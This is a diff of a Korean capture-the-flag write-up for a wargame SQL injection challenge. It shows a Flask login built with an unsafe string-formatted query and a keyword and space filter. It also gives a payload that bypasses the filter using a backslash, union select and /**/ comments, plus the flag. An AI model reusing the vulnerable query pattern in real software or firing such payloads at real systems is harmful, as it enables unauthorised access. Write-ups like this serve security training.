@@ -1,55 +1,34 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 3.3 SQLi_WAF_3"
+title: "KnockOn Bootcamp 2nd - 3.3 SQLi WAF 3"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
+  - KnockOn Bootcamp 2nd
   - SQL Injection
   - Filter Bypass
-last_modified_at: 2024-08-29T15:00:00-05:00
+last_modified_at: 2024-08-30T05:00:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10032/>
 
-![3.3 SQLi WAF 3 1](/assets/images/writeup/web-hacking/knock-on/3-3_SQLi_WAF_3_1.png)
+![3.3 SQLi WAF 3 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-3-3-sqli-waf-3-1.png)
 
-![3.3 SQLi WAF 3 2](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_2.png)
+![3.3 SQLi WAF 3 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-3-3-sqli-waf-3-1.png)
 
-![3.3 SQLi WAF 3 3](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_3.png)
-
-|
-
-|
-
-|
+![3.3 SQLi WAF 3 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-3-3-sqli-waf-3-1.png)
 
 ### 목표
 
----
-
 필터링 로직을 우회하여 admin 계정으로 로그인하기
 
-|
-
 ### 공격 기법
-
----
 
 SQL Injection
 
 - Filter Bypass
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -97,7 +76,7 @@ def login():
                 return render_template("login.html", error='no Hack!')
 
         query = text(f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'")
-        
+
         with db.engine.connect() as connection:
             result = connection.execute(query)
             user = result.fetchone()
@@ -122,17 +101,9 @@ if __name__ == "__main__":
     app.run(debug=True, host="0.0.0.0", port=8080)
 ```
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ### login()
-
----
 
 ```python
 filtering_list = ['or', 'and', '\'', '"', ' ']
@@ -140,21 +111,13 @@ filtering_list = ['or', 'and', '\'', '"', ' ']
 
 공백이 추가됨
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```sql
 union select 1,(select username from user limit 1,1),3 #
 ```
 
 기존 쿼리에서 공백을 사용하지 않고 로그인을 시도해야 함
-
-|
 
 ```sql
 /**/
@@ -164,31 +127,15 @@ union select 1,(select username from user limit 1,1),3 #
 
 맨 뒤 주석은 `--` 대신 `#`으로 해야함
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 ```python
 username: \
 
 password: union/**/select/**/1,(select/**/username/**/from/**/user/**/limit/**/1,1),3#
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```python
 K0{snow_white_is_beautiful}
 ```
-
-|
-
----
